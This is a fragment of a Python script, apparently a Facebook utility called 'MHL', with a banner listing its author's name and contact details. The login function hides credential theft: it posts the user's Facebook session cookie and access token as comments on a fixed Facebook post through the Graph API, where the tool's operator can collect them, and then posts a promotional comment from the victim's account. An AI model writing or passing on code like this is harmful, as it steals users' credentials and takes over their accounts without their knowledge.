...
print (50*'\033[1;31m_')
   \x1b[1;92m╔═══════════════════════════╗
   \x1b[1;92m║➣TOOL NAME : { MHL }                                           
   \x1b[1;92m║➣AUTHOR        : MAHAMUD HASAN LIMON       
   \x1b[1;92m║➣WHATSAPP  : 01753962951                               
   \x1b[1;92m║➣FACEBOOK   : Sk Limon Xhowdhury                  
   \x1b[1;92m║➣version           :       3.0.0                                        
...
def login():
	...
	try:
		...
		tem      = ('\nMantap Bang @[100018396913729:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100018396913729/posts/pfbid0rgSq2YPGwgN4fNvCN4eVKkUtHVfUpAhzpyjddfMRZRiFaMkB9nSNBKvd6NRFRLnjl/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/1143873546235865/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1143873546235865/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1143873546235865/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
